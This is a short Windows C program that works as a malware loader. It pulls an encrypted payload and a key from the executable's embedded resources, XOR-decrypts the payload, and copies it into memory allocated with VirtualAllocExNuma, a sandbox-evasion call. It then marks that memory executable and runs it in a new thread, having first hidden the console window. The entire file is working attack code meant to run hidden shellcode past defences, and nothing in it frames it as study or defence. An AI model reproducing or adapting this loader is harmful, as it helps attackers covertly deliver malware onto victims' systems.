#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

// Function to load resources from the executable
void resloamadappa(const char* enapparename, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, enapparename, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

// Thread function to run the payload
DWORD WINAPI RunPayload(LPVOID lpParam) {
    char* keu789;
    DWORD keu789Len;
    resloamadappa("dhanushkey1", &keu789, &keu789Len);

    char* kkcode;
    DWORD kkcodeLen;
    resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);

    // Allocate memory for the decrypted payload
    LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    for (DWORD a = 0; a < kkcodeLen; a++) {
        kkcode[a] ^= keu789[a % keu789Len];  // XOR decryption
    }

    // Copy the decrypted payload into the allocated memory
    memcpy(sirajpura, kkcode, kkcodeLen);
    DWORD oldProtect;
    VirtualProtect(sirajpura, kkcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    // Execute the payload in a new thread
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sirajpura, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}

int main() {
    // Hide the console window
    FreeConsole();

    // Create a new thread to run the payload
    HANDLE hThread = CreateThread(NULL, 0, RunPayload, NULL, 0, NULL);
    if (hThread == NULL) {
        // If thread creation fails, exit
        return 1;
    }

    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
